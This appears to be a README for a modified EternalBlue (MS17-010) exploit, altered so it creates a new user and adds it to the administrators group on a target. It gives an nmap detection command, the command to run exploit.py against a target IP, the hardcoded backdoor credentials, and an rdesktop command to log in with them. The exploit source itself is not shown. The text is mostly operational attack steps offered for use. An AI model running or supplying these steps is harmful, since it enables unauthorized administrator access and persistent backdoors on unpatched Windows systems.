# EternalBlue
I have changed the script for create a new user and add the user to administrator group

Detect the vulnerability
nmap --script smb-vuln-ms17-010 -p445 <target_ip>

How to run the exploit
python exploit.py <target_ip> <pipe_name>
once the user is created you can logged in to the system using rdesktop

 user    : John,
 password: fadf24as

rdesktop -u John -p fadf24as <target_ip>
